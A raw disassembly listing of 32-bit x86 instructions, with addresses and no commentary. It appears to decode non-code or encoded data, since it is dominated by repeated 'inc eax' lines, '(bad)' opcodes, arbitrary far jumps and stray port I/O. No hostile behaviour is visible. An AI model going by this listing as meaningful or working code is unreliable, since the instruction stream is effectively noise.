  411135:	bound  esp,QWORD PTR [edx*8+0x7cc947e1]
  41113c:	inc    ebp
  41113d:	xor    DWORD PTR [eax+0x5185a971],ecx
  411143:	jmp    0x4058:0x20c5fc81
  41114a:	inc    eax
  41114b:	inc    eax
  41114c:	inc    eax
  41114d:	inc    eax
  41114e:	inc    eax
  41114f:	inc    eax
  411150:	inc    eax
  411151:	inc    eax
  411152:	inc    eax
  411153:	inc    ebx
  411154:	mov    cl,0xbe
  411156:	push   ds
  411157:	addr16 dec edi
  411159:	adc    BYTE PTR [edx],cl
  41115b:	nop
  41115c:	dec    esp
  41115d:	mov    edi,0x20415704
  411162:	leave  
  411163:	mov    BYTE PTR [esi+0x40402c40],bh
  411169:	inc    eax
  41116a:	inc    eax
  41116b:	inc    eax
  41116c:	inc    eax
  41116d:	inc    eax
  41116e:	inc    eax
  41116f:	add    ah,bl
  411171:	dec    esp
  411172:	pop    es
  411173:	pusha  
  411174:	inc    ebx
  411175:	stos   DWORD PTR es:[edi],eax
  411176:	inc    eax
  411177:	inc    ebp
  411178:	dec    edx
  411179:	inc    edx
  41117a:	xor    al,0x40
  41117c:	sar    DWORD PTR [esi+0x41c0005f],1
  411182:	sub    BYTE PTR [ecx-0x27],0x71
  411186:	inc    eax
  411187:	inc    eax
  411188:	inc    eax
  411189:	inc    eax
  41118a:	inc    eax
  41118b:	inc    eax
  41118c:	and    eax,0x8e404040
  411191:	mov    dh,0x67
  411193:	(bad)  
  411194:	(bad)
  411197:	fnsave [edx+edi*8]
  41119a:	scas   al,BYTE PTR es:[edi]
  41119b:	jns    0x4111f9
  41119d:	rcl    dl,1
  41119f:	cmp    al,0x6c
  4111a1:	inc    eax
  4111a2:	inc    eax
  4111a3:	inc    eax
  4111a4:	inc    eax
  4111a5:	inc    eax
  4111a6:	inc    eax
  4111a7:	inc    eax
  4111a8:	inc    eax
  4111a9:	inc    eax
  4111aa:	inc    eax
  4111ab:	xor    al,bl
  4111ad:	lds    eax,FWORD PTR [edx+0x42]
  4111b0:	sub    al,0x28
  4111b2:	inc    eax
  4111b3:	add    DWORD PTR [edi+ecx*2-0x24],esp
  4111b7:	mov    ebp,0xfefcd241
  4111bc:	inc    ecx
  4111bd:	inc    ecx
  4111be:	cmp    BYTE PTR [edi+0x43],ah
  4111c1:	pop    edi
  4111c2:	mov    bh,0x1
  4111c4:	mov    WORD PTR [eax-0x57],cs
  4111c7:	push   edi
  4111c8:	xor    dl,cl
  4111ca:	push   es
  4111cb:	pop    ecx
  4111cc:	jae    0x411210
  4111ce:	and    DWORD PTR [esi-0x74],ecx
  4111d1:	rol    BYTE PTR [eax+0x40],1
  4111d4:	inc    eax
  4111d5:	inc    eax
  4111d6:	inc    eax
  4111d7:	inc    eax
  4111d8:	rol    DWORD PTR [eax+0x40],0x77
  4111dc:	add    ebp,DWORD PTR [eax+0x47c5a8c0]
  4111e2:	jmp    0x41122d
  4111e4:	adc    BYTE PTR [edx],0xd8
  4111e7:	adc    DWORD PTR [edx+0x40],edx
  4111ea:	inc    eax
  4111eb:	add    BYTE PTR [eax+0x40],al
  4111ee:	inc    eax
  4111ef:	inc    eax
  4111f0:	inc    eax
  4111f1:	inc    eax
  4111f2:	test   ecx,ebp
  4111f4:	nop
  4111f5:	xor    DWORD PTR [ebx+eax*1-0x509f0b44],0x5815ff04
  411200:	inc    edx
  411201:	xor    eax,0x4203404c
  411207:	cmp    DWORD PTR [esi-0x3c],esp
  41120a:	mov    ds:0x564a9061,al
  41120f:	lods   al,BYTE PTR ds:[esi]
  411210:	inc    eax
  411211:	inc    eax
  411212:	inc    eax
  411213:	inc    eax
  411214:	inc    eax
  411215:	inc    eax
  411216:	inc    eax
  411217:	inc    eax
  411218:	inc    eax
  411219:	inc    eax
  41121a:	cmp    al,0x4f
  41121c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41121d:	aam    0x3
  41121f:	add    DWORD PTR [ebp+eax*2-0x27bc9fbc],eax
  411226:	dec    edx
  411227:	cmp    eax,0xa12a0c7f
  41122c:	ror    BYTE PTR [ebx+0x7b],cl
  41122f:	add    ch,BYTE PTR [eax-0xb3cbfbf]
  411235:	push   ecx
  411236:	jne    0x41125a
  411238:	adc    DWORD PTR [eax+0x40],eax
  41123b:	inc    eax
  41123c:	inc    eax
  41123d:	inc    eax
  41123e:	inc    eax
  41123f:	int3   
  411240:	jne    0x411282
  411242:	jae    0x41126e
  411244:	mov    edi,0xbe41420d
  411249:	push   ds
  41124a:	adc    BYTE PTR [si-0x61],al
  41124e:	in     eax,0x40
  411250:	add    cl,al
  411252:	inc    eax
  411253:	inc    eax
  411254:	inc    eax
  411255:	inc    eax
  411256:	add    BYTE PTR [eax+0x37],al
  411259:	xchg   esp,eax
  41125a:	bound  esi,QWORD PTR [esi+0x7a8a44b0]
  411260:	retf   0x4483
  411263:	dec    ecx
  411264:	inc    ebx
  411265:	xchg   esp,eax
  411266:	inc    ecx
  411267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411268:	adc    al,0xff
  41126a:	inc    edi
  41126b:	shr    ecx,1
  41126d:	je     0x4112b2
  41126f:	xor    BYTE PTR [eax+0x40],al
  411272:	inc    eax
  411273:	inc    eax
  411274:	inc    eax
  411275:	inc    eax
  411276:	inc    eax
  411277:	inc    eax
  411278:	inc    DWORD PTR [eax+0x68]
  41127b:	add    ecx,0xffffffb4
  41127e:	clc    
  41127f:	jae    0x4112b1
  411281:	xchg   BYTE PTR [ebp+0x1a],dl
  411284:	sbb    eax,DWORD PTR ds:0x8988f468
  41128a:	push   ebx
  41128b:	add    eax,DWORD PTR [eax+0x40]
  41128e:	inc    eax
  41128f:	inc    eax
  411290:	inc    eax
  411291:	inc    eax
  411292:	inc    eax
  411293:	inc    eax
  411294:	inc    eax
  411295:	inc    eax
  411296:	jecxz  0x4112ea
  411298:	lock inc edi
  41129a:	inc    edi
  41129b:	les    edx,FWORD PTR [ebp+0x4a]
  41129e:	cmp    eax,0x85386586
  4112a3:	sub    eax,0xb24a815f
  4112a8:	add    BYTE PTR [edi-0x31e13fbd],dh
  4112ae:	int3   
  4112af:	adc    eax,0x799015c8
  4112b4:	jns    0x411237
  4112b6:	imul   esi,DWORD PTR [edi+0x65],0xffffffc8
  4112ba:	inc    edx
  4112bb:	inc    eax
  4112bc:	inc    eax
  4112bd:	inc    eax
  4112be:	inc    eax
  4112bf:	inc    eax
  4112c0:	inc    eax
  4112c1:	inc    eax
  4112c2:	inc    eax
  4112c3:	add    BYTE PTR [ebx+0x67],dh
  4112c6:	sbb    al,0x18
  4112c8:	out    0x75,al
  4112ca:	push   edx
  4112cb:	inc    ebx
  4112cc:	add    eax,0xfad40151
  4112d1:	clc    
  4112d2:	daa    
  4112d3:	sar    DWORD PTR [edi-0x4fad7ea6],1
  4112d9:	arpl   si,si
  4112db:	mov    ecx,esi
  4112dd:	aaa    
  4112de:	or     DWORD PTR [eax+0x40],eax
  4112e1:	inc    eax
  4112e2:	inc    eax
  4112e3:	inc    eax
  4112e4:	inc    eax
  4112e5:	and    eax,0x47404040
  4112ea:	or     eax,0x42164fc1
  4112ef:	lahf   
  4112f0:	dec    ecx
  4112f1:	dec    ebp
  4112f2:	sub    al,ah
  4112f4:	inc    ecx
  4112f5:	test   eax,0x6701607a
  4112fa:	or     DWORD PTR [edi+0x43],0xfffffff0
  4112fe:	push   ebx
  4112ff:	xor    edi,DWORD PTR [edi+0x3376aec3]
  411305:	inc    ecx
  411306:	adc    DWORD PTR [edi],ecx
  411308:	push   ds
  411309:	mov    WORD PTR ds:0x63430d97,es
  41130f:	xor    DWORD PTR [eax+0x40],eax
  411312:	inc    eax
  411313:	inc    eax
  411314:	inc    eax
  411315:	inc    eax
  411316:	inc    eax
  411317:	inc    eax
  411318:	inc    eax
  411319:	inc    eax
  41131a:	adc    ah,BYTE PTR [edx+0x56]
  41131d:	(bad)  
  41131e:	retf   
  41131f:	xor    cl,bl
  411321:	sub    DWORD PTR ds:[edx+edx*4+0x42],eax
  411326:	mov    bh,0x84
  411328:	push   esi
  411329:	je     0x41133f
  41132b:	sub    ch,BYTE PTR [eax+esi*1+0x405e4769]
  411332:	inc    eax
  411333:	inc    eax
  411334:	inc    eax
  411335:	inc    eax
  411336:	inc    eax
  411337:	rol    DWORD PTR [eax+0x40],0x68
  41133b:	add    DWORD PTR [ebp+edx*1+0x28],0x467585cb
  411343:	inc    ebx
  411344:	sub    ah,BYTE PTR [eax+esi*2-0x3b]
  411348:	inc    ebx
  411349:	pop    esp
  41134a:	popf   
  41134b:	sub    BYTE PTR [esi+ecx*4+0x4090a962],0x40
  411353:	add    BYTE PTR [eax+0x40],al
  411356:	inc    eax
  411357:	inc    eax
  411358:	inc    eax
  411359:	inc    eax
  41135a:	jb     0x41131c
  41135c:	add    DWORD PTR [edx+0x2],eax
  41135f:	jle    0x411309
  411361:	pop    edi
  411362:	fidiv  WORD PTR [ebx]
  411364:	inc    eax
  411365:	cld    
  411366:	xor    eax,0xa54305c8
  41136b:	push   edi
  41136c:	pusha  
  41136d:	mov    al,0x50
  41136f:	test   al,0x87
  411371:	rcl    DWORD PTR [ecx+esi*8-0x28b3ade3],1
  411378:	pop    ebx
  411379:	cmp    esp,DWORD PTR [eax+0x4040034d]
  41137f:	inc    eax
  411380:	inc    eax
  411381:	inc    eax
  411382:	inc    eax
  411383:	inc    eax
  411384:	inc    eax
  411385:	inc    eax
  411386:	inc    eax
  411387:	int    0x3d
  411389:	push   edi
  41138a:	stos   DWORD PTR es:[edi],eax
  41138b:	mov    esi,0x75f150be
  411390:	ret    
  411391:	push   edx
  411392:	mov    bh,0x5
  411394:	cli    
  411395:	scas   eax,DWORD PTR es:[edi]
  411396:	adc    eax,0x1593085c
  41139b:	aas    
  41139c:	inc    eax
  41139d:	inc    eax
  41139e:	inc    eax
  41139f:	inc    eax
  4113a0:	inc    eax
  4113a1:	inc    eax
  4113a2:	int3   
  4113a3:	jne    0x4113e5
  4113a5:	loopne 0x4113ca
  4113a7:	add    BYTE PTR [esi],dh
  4113a9:	inc    esp
  4113aa:	cmp    al,0xc8
  4113ac:	inc    ecx
  4113ad:	jno    0x4113f5
  4113af:	and    DWORD PTR [edi+0x73],ecx
  4113b2:	push   ebx
  4113b3:	mov    ds:0x1593a343,al
  4113b8:	and    BYTE PTR [eax-0x55],bh
  4113bb:	xchg   ebx,eax
  4113bc:	xor    BYTE PTR [eax+0x0],al
  4113bf:	rol    DWORD PTR [eax+0x40],0x40
  4113c3:	inc    eax
  4113c4:	add    BYTE PTR [eax-0x41],al
  4113c7:	push   ebx
  4113c8:	add    esp,0x62
  4113cb:	jbe    0x411383
  4113cd:	and    BYTE PTR [edx],0xde
  4113d0:	cmc    
  4113d1:	xor    al,0x4c
  4113d3:	ret    0x4040
  4113d6:	inc    eax
  4113d7:	inc    eax
  4113d8:	inc    eax
  4113d9:	inc    eax
  4113da:	inc    eax
  4113db:	inc    eax
  4113dc:	inc    DWORD PTR [eax+0xd]
  4113df:	inc    edi
  4113e0:	gs inc esi
  4113e2:	add    cl,BYTE PTR [edx+0x28]
  4113e5:	(bad)  
  4113e6:	test   BYTE PTR [ebp-0x31ea40b6],0x41
  4113ed:	add    DWORD PTR [edi+0x40],ecx
  4113f0:	inc    eax
  4113f1:	inc    eax
  4113f2:	inc    eax
  4113f3:	inc    eax
  4113f4:	inc    eax
  4113f5:	inc    eax
  4113f6:	inc    eax
  4113f7:	inc    eax
  4113f8:	inc    eax
  4113f9:	inc    ebx
  4113fa:	test   al,0x69
  4113fc:	inc    eax
  4113fd:	jp     0x4113af
  4113ff:	rcl    BYTE PTR [eax-0x70],0x0
  411403:	push   ecx
  411404:	pusha  
  411405:	arpl   WORD PTR [ecx+0x63],bp
  411408:	push   esp
  411409:	jl     0x4113be
  41140b:	repz leave 
  41140d:	push   esp
  41140e:	les    ebx,FWORD PTR [ebp-0xa]
  411411:	inc    ebx
  411412:	xchg   esi,eax
  411413:	dec    ebp
  411414:	push   cs
  411415:	arpl   WORD PTR [edi-0x58],di
  411418:	dec    edi
  411419:	rcr    DWORD PTR [ebx+edx*2+0x404096f1],1
  411420:	inc    eax
  411421:	inc    eax
  411422:	inc    eax
  411423:	inc    eax
  411424:	inc    eax
  411425:	inc    eax
  411426:	add    ch,dl
  411428:	adc    ch,BYTE PTR [eax+0x621a94cf]
  41142e:	dec    edx
  41142f:	ret    0x590
  411432:	push   0x23
  411434:	xchg   ebp,eax
  411435:	dec    eax
  411436:	int    0x62
  411438:	adc    eax,0x37d0b0cb
  41143d:	test   DWORD PTR [ebp-0x33],edi
  411440:	inc    edx
  411441:	mov    ebx,0x49574f6e
  411446:	test   eax,0x41152e66
  41144b:	inc    eax
  41144c:	inc    eax
  41144d:	inc    eax
  41144e:	inc    eax
  41144f:	inc    eax
  411450:	inc    eax
  411451:	and    eax,0xdd404040
  411456:	mov    bl,0x0
  411458:	mov    al,0xc0
  41145a:	add    al,0xf6
  41145c:	inc    ebx
  41145d:	xor    al,0x47
  41145f:	sub    BYTE PTR [edx+0x3],dh
  411462:	inc    eax
  411463:	inc    eax
  411464:	inc    eax
  411465:	inc    eax
  411466:	inc    eax
  411467:	inc    eax
  411468:	inc    eax
  411469:	inc    eax
  41146a:	inc    eax
  41146b:	inc    eax
  41146c:	pop    edx
  41146d:	dec    edi
  41146e:	xor    BYTE PTR [edx-0x5ecdb46d],ch
  411474:	jbe    0x41141e
  411476:	cld    
  411477:	stos   DWORD PTR es:[edi],eax
  411478:	inc    edx
  411479:	add    BYTE PTR [edx+0x10],ah
  41147c:	xchg   esp,eax
  41147d:	dec    edx
  41147e:	inc    edi
  41147f:	nop
  411480:	adc    BYTE PTR [esp+esi*8],ah
  411483:	lock gs inc eax
  411486:	test   DWORD PTR [edi+0x40404040],ebp
  41148c:	inc    eax
  41148d:	inc    eax
  41148e:	rol    DWORD PTR [eax+0x40],0x68
  411492:	daa    
  411493:	add    BYTE PTR [edx+0xe],ah
  411496:	arpl   WORD PTR [ebx-0x10],ax
  411499:	inc    eax
  41149a:	add    BYTE PTR [ebx-0x33],0x9e
  41149e:	ins    BYTE PTR es:[edi],dx
  41149f:	nop
  4114a0:	mov    ah,BYTE PTR [eax+0x6d]
  4114a3:	push   eax
  4114a4:	sbb    ch,BYTE PTR [eax+0x405f1962]
  4114aa:	inc    eax
  4114ab:	add    BYTE PTR [eax+0x40],al
  4114ae:	inc    eax
  4114af:	inc    eax
  4114b0:	inc    eax
  4114b1:	inc    eax
  4114b2:	inc    esp
  4114b3:	sub    dl,BYTE PTR ds:0x43c55de1
  4114b9:	mov    eax,0xf9dc0d3f
  4114be:	lahf   
  4114bf:	mov    al,0xd1
  4114c1:	mov    al,BYTE PTR [ebx+eax*4+0x47]
  4114c5:	adc    BYTE PTR [eax+0x40],al
  4114c8:	inc    eax
  4114c9:	inc    eax
  4114ca:	inc    eax
  4114cb:	inc    eax
  4114cc:	inc    eax
  4114cd:	inc    eax
  4114ce:	inc    eax
  4114cf:	inc    eax
  4114d0:	pop    DWORD PTR [ebp+0x4e3f6eb8]
  4114d6:	aam    0xf1
  4114d8:	mov    BYTE PTR [esi+ebp*4+0x12],cl
  4114dc:	mov    ds:0x40626902,eax
  4114e1:	inc    eax
  4114e2:	inc    eax
  4114e3:	inc    eax
  4114e4:	inc    eax
  4114e5:	inc    eax
  4114e6:	int3   
  4114e7:	jne    0x411529
  4114e9:	test   al,0xcd
  4114eb:	sar    bl,0x7b
  4114ee:	and    ch,BYTE PTR [ebp+eax*8-0x52534897]
  4114f5:	jg     0x411537
  4114f7:	add    cl,al
  4114f9:	inc    eax
  4114fa:	inc    eax
  4114fb:	inc    eax
  4114fc:	inc    eax
  4114fd:	add    BYTE PTR [eax+0x47],al
  411500:	inc    ecx
  411501:	jne    0x4114b0
  411503:	add    eax,0x824ce941
  411508:	lods   eax,DWORD PTR ds:[esi]
  411509:	mov    DWORD PTR [ebx-0xa],esp
  41150c:	inc    ebx
  41150d:	dec    ebx
  41150e:	fistp  QWORD PTR [eax]
  411510:	mov    cl,0xbf
  411512:	lahf   
  411513:	dec    edi
  411514:	xor    BYTE PTR [eax+eax*2+0x40404040],dl
  41151b:	inc    eax
  41151c:	inc    eax
  41151d:	inc    eax
  41151e:	inc    DWORD PTR [eax+0x3]
  411521:	iret   
  411522:	test   al,0xbf
  411524:	mov    esp,0x9e20f864
  411529:	add    BYTE PTR [eax],dl
  41152b:	mov    edi,0x5b473541
  411530:	add    esi,DWORD PTR [ebx-0x50]
  411533:	inc    eax
  411534:	inc    eax
  411535:	inc    eax
  411536:	inc    eax
  411537:	inc    eax
  411538:	inc    eax
  411539:	inc    eax
  41153a:	inc    eax
  41153b:	inc    eax
  41153c:	inc    eax
  41153d:	cmp    dl,BYTE PTR [eax+0x43]
  411540:	test   DWORD PTR [eax-0x2abebf61],ecx
  411546:	dec    edx
  411547:	mov    edx,0x9413e343
  41154c:	pop    esi
  41154d:	inc    edx
  41154e:	mov    al,ds:0x642790c3
  411553:	jno    0x411595
  411555:	inc    eax
  411556:	inc    eax
  411557:	inc    eax
  411558:	inc    eax
  411559:	inc    eax
  41155a:	inc    eax
  41155b:	inc    eax
  41155c:	add    BYTE PTR [esi+ebp*2+0x6b36baa2],dl
  411563:	mov    ah,0x40
  411565:	push   es
  411566:	test   BYTE PTR [edx+0x15],cl
  411569:	inc    ebx
  41156a:	push   ds
  41156b:	sub    al,0x7a
  41156d:	mov    ebp,0xd1f6a110
  411572:	jae    0x4115b7
  411574:	dec    esp
  411575:	test   al,0xf0
  411577:	mov    al,ds:0x1298484f
  41157c:	and    BYTE PTR [edx+eiz*2-0x3a],0xb7
  411581:	inc    eax
  411582:	inc    eax
  411583:	inc    eax
  411584:	inc    eax
  411585:	inc    eax
  411586:	inc    eax
  411587:	and    eax,0x71404040
  41158c:	jbe    0x411543
  41158e:	cmp    dh,BYTE PTR [ebx-0x33]
  411591:	dec    ebp
  411592:	or     eax,0xedba8f6e
  411597:	bound  eax,QWORD PTR [edi]
  411599:	pop    esi
  41159a:	enter  0x392,0x55
  41159e:	add    al,BYTE PTR [ecx+ebx*4-0x62]
  4115a2:	inc    ebx
  4115a3:	inc    ecx
  4115a4:	repnz imul DWORD PTR [ebp+0x46]
  4115a8:	adc    BYTE PTR [edi+0x1e824340],dl
  4115ae:	pop    edi
  4115af:	leave  
  4115b0:	inc    eax
  4115b1:	inc    eax
  4115b2:	inc    eax
  4115b3:	inc    eax
  4115b4:	inc    eax
  4115b5:	inc    eax
  4115b6:	inc    eax
  4115b7:	inc    eax
  4115b8:	inc    eax
  4115b9:	inc    eax
  4115ba:	lock add eax,0xd1003042
  4115c0:	add    eax,0x38566259
  4115c5:	hlt    
  4115c6:	mov    ss,WORD PTR [edx+0x55]
  4115c9:	sbb    ebp,eax
  4115cb:	pushf  
  4115cc:	test   eax,0x4a72fa47
  4115d1:	xor    eax,0x85c105bb
  4115d6:	(bad)  
  4115d7:	sbb    BYTE PTR es:[edx-0x7f],0x6a
  4115dc:	mov    esp,0x4040f543
  4115e1:	inc    eax
  4115e2:	inc    eax
  4115e3:	inc    eax
  4115e4:	inc    eax
  4115e5:	rol    DWORD PTR [eax+0x40],0x4c
  4115e9:	jnp    0x41156f
  4115eb:	adc    BYTE PTR [esi],bh
  4115ed:	or     eax,0x40d11e90
  4115f2:	push   ebp
  4115f3:	lock fs not bl
  4115f7:	inc    ebp
  4115f8:	or     DWORD PTR [edx+eiz*1],eax
  4115fb:	bound  ebx,QWORD PTR [edi+0x4040434f]
  411601:	add    BYTE PTR [eax+0x40],al
  411604:	inc    eax
  411605:	inc    eax
  411606:	inc    eax
  411607:	inc    eax
  411608:	xchg   edx,eax
  411609:	sbb    esi,DWORD PTR [eax+0x79]
  41160c:	dec    esp
  41160d:	mov    esp,0x6564d132
  411612:	inc    eax
  411613:	arpl   WORD PTR [eax+eax*2+0x40404040],sp
  41161a:	inc    eax
  41161b:	inc    eax
  41161c:	inc    eax
  41161d:	inc    eax
  41161e:	inc    eax
  41161f:	inc    ebx
  411620:	aas    
  411621:	sahf   
  411622:	div    BYTE PTR [edx+0x50348200]
  411628:	inc    eax
  411629:	int    0x67
  41162b:	aaa    
  41162c:	js     0x411652
  41162e:	xor    eax,0x89e94099
  411633:	aaa    
  411634:	inc    eax
  411635:	inc    eax
  411636:	inc    eax
  411637:	inc    eax
  411638:	inc    eax
  411639:	inc    eax
  41163a:	int3   
  41163b:	jne    0x41167d
  41163d:	inc    eax
  41163e:	fs dec ecx
  411640:	jo     0x411682
  411642:	(bad)  
  411643:	mov    es,esp
  411645:	arpl   WORD PTR [edi+0x419f544c],ax
  41164b:	xchg   ebx,esi
  41164d:	call   0x7e3a53a2
  411652:	inc    eax
  411653:	add    cl,al
  411655:	inc    eax
  411656:	inc    eax
  411657:	inc    eax
  411658:	inc    eax
  411659:	add    BYTE PTR [eax+0x43],al
  41165c:	dec    esp
  41165d:	add    BYTE PTR [eax-0x37],al
  411660:	inc    edx
  411661:	xchg   esi,eax
  411662:	dec    edx
  411663:	xor    bl,al
  411665:	push   ebx
  411666:	jp     0x4116b9
  411668:	add    al,0x3a
  41166a:	je     0x41165c
  41166c:	ficom  WORD PTR [eax+0x51]
  41166f:	retf   
  411670:	sbb    BYTE PTR [esi+0x40b04734],ah
  411676:	inc    eax
  411677:	inc    eax
  411678:	inc    eax
  411679:	inc    eax
  41167a:	inc    eax
  41167b:	inc    eax
  41167c:	inc    eax
  41167d:	inc    DWORD PTR [eax-0xd]
  411680:	add    BYTE PTR [edx+0x62],al
  411683:	pop    esi
  411684:	cmp    eax,0x2f483885
  411689:	and    al,BYTE PTR [edx-0x4ebcc36c]
  41168f:	xor    eax,0x4040b86a
  411694:	inc    eax
  411695:	inc    eax
  411696:	inc    eax
  411697:	inc    eax
  411698:	inc    eax
  411699:	inc    eax
  41169a:	inc    eax
  41169b:	inc    eax
  41169c:	jo     0x4116b3
  41169e:	inc    eax
  41169f:	nop
  4116a0:	xlat   BYTE PTR ds:[ebx]
  4116a1:	add    DWORD PTR [edx],eax
  4116a3:	bound  ebp,QWORD PTR ds:0xe8f04069
  4116a9:	pop    ds
  4116aa:	and    edi,ecx
  4116ac:	push   esp
  4116ad:	push   ds
  4116ae:	inc    eax
  4116af:	inc    ebx
  4116b0:	jmp    0x3ce15bb6
  4116b5:	inc    eax
  4116b6:	inc    eax
  4116b7:	inc    eax
  4116b8:	inc    eax
  4116b9:	inc    eax
  4116ba:	inc    eax
  4116bb:	inc    eax
  4116bc:	inc    eax
  4116bd:	add    BYTE PTR [ebx-0x67],ah
  4116c0:	sar    DWORD PTR [ebp+0x1f],1
  4116c3:	add    DWORD PTR [edx+0x45],esp
  4116c6:	xor    BYTE PTR [edx+0x3c4c7e03],bh
  4116cc:	inc    esp
  4116cd:	int3   
  4116ce:	cli    
  4116cf:	rcr    DWORD PTR [edx],0x21
  4116d2:	xchg   ecx,eax
  4116d3:	sub    BYTE PTR [eax+0x20bc9246],0x59
  4116da:	inc    eax
  4116db:	inc    eax
  4116dc:	inc    eax
  4116dd:	inc    eax
  4116de:	inc    eax
  4116df:	inc    eax
  4116e0:	and    eax,0x3f404040
  4116e5:	imul   edi,DWORD PTR ds:0x4b150d42,0x45
  4116ec:	imul   edi,DWORD PTR [ecx],0xf6c967c3
  4116f2:	inc    ecx
  4116f3:	retf   0x4071
  4116f6:	arpl   WORD PTR [ebx],cx
  4116f8:	es inc eax
  4116fa:	inc    eax
  4116fb:	inc    eax
  4116fc:	inc    eax
  4116fd:	inc    eax
  4116fe:	inc    eax
  4116ff:	inc    eax
  411700:	inc    eax
  411701:	inc    eax
  411702:	inc    eax
  411703:	dec    eax
  411704:	inc    ebx
  411705:	push   edx
  411706:	inc    esi
  411707:	xor    al,0x42
  411709:	mov    BYTE PTR [ebx+0x19],al
  41170c:	xor    BYTE PTR [eax],ch
  41170e:	mov    al,0x66
  411710:	pop    ebp
  411711:	bound  edi,QWORD PTR [ebx]
  411713:	and    al,0xec
  411715:	cs je  0x411699
  411718:	and    al,0x10
  41171a:	or     cl,0x47
  41171d:	sbb    ebp,DWORD PTR [ecx+0x41]
  411720:	inc    ebp
  411721:	fcom   QWORD PTR [ebx-0x3b]
  411724:	test   edx,esi
  411726:	jae    0x411768
  411728:	inc    eax
  411729:	inc    eax
  41172a:	inc    eax
  41172b:	inc    eax
  41172c:	inc    eax
  41172d:	rol    DWORD PTR [eax+0x40],0x0
  411731:	aam    0x62
  411733:	nop
  411734:	dec    edi
  411735:	inc    ebx
  411736:	dec    eax
  411737:	ins    BYTE PTR es:[edi],dx
  411738:	and    bh,BYTE PTR [edx+ecx*1]
  41173b:	add    eax,0x147c9043
  411740:	push   eax
  411741:	test   al,0xc4
  411743:	leave  
  411744:	xchg   edi,eax
  411745:	lea    eax,[ebx+0x69]
  411748:	inc    eax
  411749:	inc    eax
  41174a:	add    BYTE PTR [eax+0x40],al
  41174d:	inc    eax
  41174e:	inc    eax
  41174f:	inc    eax
  411750:	inc    eax
  411751:	adc    BYTE PTR [edx],0x62
  411754:	es addr16 inc ebx
  411757:	jmp    DWORD PTR cs:[edx-0x48]
  41175b:	sbb    al,0x41
  41175d:	add    ecx,edx
  41175f:	sub    eax,0x48415a60
  411764:	cmp    ebx,esp
  411766:	and    eax,0xc2405aca
  41176b:	mov    ebp,0x1d4067ac
  411770:	mov    cl,0x7d
  411772:	lock or edx,DWORD PTR [ebx-0x24]
  411776:	inc    eax
  411777:	inc    eax
  411778:	inc    eax
  411779:	inc    eax
  41177a:	inc    eax
  41177b:	inc    eax
  41177c:	inc    eax
  41177d:	inc    eax
  41177e:	inc    eax
  41177f:	inc    eax
  411780:	jmp    0xa94:0x52c19de3
  411787:	mov    ecx,edi
  411789:	pop    ds
  41178a:	popa   
  41178b:	and    BYTE PTR [ebx+0x62],0xb8
  41178f:	rol    DWORD PTR [ecx+0x6a],0x9f
  411793:	and    DWORD PTR [ebp+edx*8+0x65],eax
  411797:	pop    eax
  411798:	inc    ebx
  411799:	jecxz  0x4117d3
  41179b:	pusha  
  41179c:	(bad)  
  41179d:	out    0x70,al
  41179f:	or     BYTE PTR [eax],dh
  4117a1:	fwait
  4117a2:	xchg   ebp,eax
  4117a3:	add    BYTE PTR [ebx-0x1f],0x40
  4117a7:	inc    eax
  4117a8:	inc    eax
  4117a9:	inc    eax
  4117aa:	inc    eax
  4117ab:	inc    eax
  4117ac:	int3   
  4117ad:	jne    0x4117ef
  4117af:	jge    0x4117f2
  4117b1:	call   0xe464954c
  4117b6:	cli    
  4117b7:	fnstsw WORD PTR [ebx+0x47]
  4117ba:	sub    dl,ah
  4117bc:	inc    edx
  4117bd:	outs   dx,DWORD PTR ds:[esi]
  4117be:	or     eax,DWORD PTR [ebx]
  4117c0:	test   DWORD PTR fs:[edi+0x40610032],ebx
  4117c7:	add    cl,al
  4117c9:	inc    eax
  4117ca:	inc    eax
  4117cb:	inc    eax
  4117cc:	inc    eax
  4117cd:	add    BYTE PTR [eax-0x6b],al
  4117d0:	call   0x748a7837
  4117d5:	mov    WORD PTR ss:[edx+0x66],fs
  4117d9:	push   edx
  4117da:	lock fst QWORD PTR [ecx]
  4117dd:	push   0x1d
  4117df:	int    0x5
  4117e1:	pusha  
  4117e2:	inc    eax
  4117e3:	inc    eax
  4117e4:	inc    eax
  4117e5:	inc    eax
  4117e6:	inc    eax
  4117e7:	inc    eax
  4117e8:	inc    eax
  4117e9:	inc    eax
  4117ea:	inc    DWORD PTR [eax-0x5d]
  4117ed:	pop    edi
  4117ee:	inc    esp
  4117ef:	rcr    BYTE PTR [ebp+0x23],cl
  4117f2:	leave  
  4117f3:	aad    0xaa
  4117f5:	aad    0x33
  4117f7:	and    BYTE PTR ds:0x43a25499,0x5a
  4117fe:	ins    DWORD PTR es:[edi],dx
  4117ff:	jl     0x41183a
  411801:	or     esp,DWORD PTR [ecx+eax*8-0x2e]
  411805:	dec    esi
  411806:	xor    esp,DWORD PTR [ecx]
  411808:	inc    eax
  411809:	xchg   esp,eax
  41180a:	iret   
  41180b:	mov    ds:0x404040d1,al
  411810:	inc    eax
  411811:	inc    eax
  411812:	inc    eax
  411813:	inc    eax
  411814:	inc    eax
  411815:	inc    eax
  411816:	inc    eax
  411817:	stos   DWORD PTR es:[edi],eax
  411818:	leave  
  411819:	xchg   ecx,eax
  41181a:	arpl   WORD PTR [edx-0x13],sp
  41181d:	xchg   ebx,eax
  41181e:	xchg   esp,eax
  41181f:	out    dx,eax
  411820:	je     0x411841
  411822:	sbb    al,ch
  411824:	inc    eax
  411825:	inc    eax
  411826:	inc    eax
  411827:	inc    eax
  411828:	inc    eax
  411829:	inc    eax
  41182a:	inc    eax
  41182b:	inc    eax
  41182c:	add    BYTE PTR [eax-0x50a2a045],ch
  411832:	test   DWORD PTR [edi+0x1d],esi
  411835:	adc    BYTE PTR ds:0x1a3a23a8,cl
  41183b:	xor    eax,0x41434885
  411840:	outs   dx,DWORD PTR ds:[esi]
  411841:	sbb    eax,0x410bb48b
  411846:	sbb    al,BYTE PTR [ebx-0xa]
  411849:	push   ecx
  41184a:	aad    0x5d
  41184c:	xchg   esp,eax
  41184d:	shr    DWORD PTR [eax+0x40404030],cl
  411853:	inc    eax
  411854:	inc    eax
  411855:	inc    eax
  411856:	and    eax,0x3404040
  41185b:	dec    ebp
  41185c:	and    ch,0x62
  41185f:	cmp    al,0x62
  411861:	in     al,0xc5
  411863:	push   ecx
  411864:	das    
  411865:	sub    ch,dl
  411867:	xor    esi,0x49383747
  41186d:	dec    esp
  41186e:	es mov eax,0x53e6854f
  411874:	add    ch,ah
  411876:	inc    eax
  411877:	inc    eax
  411878:	inc    eax
